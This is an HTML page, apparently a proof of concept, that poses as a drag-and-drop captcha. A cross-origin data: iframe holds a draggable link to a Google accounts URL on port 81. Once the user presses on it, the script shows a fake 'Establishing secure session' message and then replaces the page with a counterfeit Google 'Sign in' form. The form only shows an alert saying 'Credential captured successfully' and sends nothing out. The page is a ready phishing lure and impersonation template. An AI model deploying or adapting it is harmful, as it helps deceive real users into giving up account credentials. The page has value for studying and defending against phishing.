<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Simple Link Page</title>
    <style>
        body {
            font-family: "Inter", sans-serif;
            background-color: #f3f4f6;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: flex-start;
            min-height: 100vh;
            padding: 1rem;
            padding-top: 5rem;
            margin: 0;
            overflow: hidden;
        }

        .main-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 28rem;
            background-color: #fff;
            padding: 2rem;
            border-radius: 0.75rem;
            box-shadow: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            gap: 2rem;
        }

        .captcha-text {
            color: #4b5563;
            font-size: 1.5rem;
            font-weight: 600;
            text-align: center;
            margin-bottom: 2rem;
        }

        .link-style, .drop-area-style {
            color: #2563eb;
            font-size: 2.25rem;
            font-weight: 800;
            text-align: center;
            display: block;
            padding: 2rem 1rem;
            border-radius: 0.5rem;
            transition: color 0.3s, transform 0.3s;
            width: 100%;
            text-decoration: none;
            box-sizing: border-box;
        }

        .link-style:hover {
            color: #1d4ed8;
            transform: scale(1.05);
        }

        .drop-area-style {
            color: #6b7280;
            border: 2px dashed #d1d5db;
        }

        iframe {
            border: none;
            width: 100%;
            height: auto;
            min-height: 8rem;
        }
    </style>
</head>
<body>
    <div class="main-container">
        <div class="captcha-text">
            Solve captcha: drag and drop this element to proceed
        </div>

        <!-- Cross-origin iframe memuat elemen target yang dapat diseret -->
        <iframe src='data:text/html,<a href="https://accounts.google.com:81/" ontouchstart="parent.postMessage(1,&quot;*&quot;)" onmousedown="parent.postMessage(1,&quot;*&quot;)" draggable="true" class="link-style" style="color: %232563eb; font-size: 2.25rem; font-weight: 800; text-align: center; display: block; padding: 2rem 1rem; border-radius: 0.5rem; text-decoration: none; box-sizing: border-box;">Drag me</a>'></iframe>

        <div class="drop-area-style">
            Drop me here
        </div>
    </div>

<script>
window.addEventListener("message", (m) => {
    if (m.data !== 1) return;

    // Transisi status pertama: Indikator proses asinkron
    setTimeout(() => {
        document.body.innerHTML = `<h1 style="font-family:sans-serif; text-align:center; margin-top:20vh; color:#555;">Establishing secure session...</h1>`;
    }, 2000);

    // Transisi status kedua: Render antarmuka tiruan (Fake Login Form)
    setTimeout(() => {
        document.body.innerHTML = `
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Sign in - Google Accounts</title>
            <style>
                body {
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                    background-color: #f0f2f5;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    min-height: 100vh;
                    margin: 0;
                }
                .login-container {
                    background-color: #fff;
                    padding: 2.5rem;
                    border-radius: 8px;
                    box-shadow: 0 1px 3px rgba(60, 64, 67, 0.3), 0 4px 8px rgba(60, 64, 67, 0.15);
                    width: 100%;
                    max-width: 400px;
                    text-align: center;
                    box-sizing: border-box;
                }
                .input-field {
                    width: 100%;
                    padding: 0.75rem 1rem;
                    margin-bottom: 1.25rem;
                    border: 1px solid #dadce0;
                    border-radius: 4px;
                    font-size: 1rem;
                    box-sizing: border-box;
                }
                .input-field:focus {
                    outline: none;
                    border-color: #1a73e8;
                    box-shadow: 0 0 0 1px #1a73e8;
                }
                .btn-primary {
                    background-color: #1a73e8;
                    color: #fff;
                    padding: 0.75rem 1.5rem;
                    border-radius: 4px;
                    font-size: 1rem;
                    font-weight: 500;
                    cursor: pointer;
                    border: none;
                }
                .btn-primary:hover {
                    background-color: #1766d1;
                }
                .link-text {
                    color: #1a73e8;
                    text-decoration: none;
                    font-weight: 500;
                    font-size: 0.875rem;
                }
                .flex-between {
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    width: 100%;
                    margin-top: 1.5rem;
                }
                .text-left {
                    text-align: left;
                }
            </style>
        </head>
        <body>
            <div class="login-container">
                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" style="margin-bottom: 1.5rem; width: 90px;">
                <h1 style="font-size: 24px; font-weight: normal; margin-bottom: 0.5rem;">Sign in</h1>
                <p style="font-size: 16px; color: #5f6368; margin-bottom: 1.5rem;">Use your Google Account</p>

                <form id="loginForm" onsubmit="event.preventDefault(); alert('Credential captured successfully.');">
                    <input type="email" id="email" class="input-field" placeholder="Email or phone" required>
                    <input type="password" id="password" class="input-field" placeholder="Enter your password" required>

                    <div class="text-left" style="margin-bottom: 1.5rem;">
                        <a href="#" class="link-text">Forgot password?</a>
                    </div>

                    <div class="flex-between">
                        <a href="#" class="link-text">Create account</a>
                        <button type="submit" class="btn-primary">Next</button>
                    </div>
                </form>
            </div>
        </body>
        </html>
        `;
    }, 3500);
});
</script>
</body>
</html>
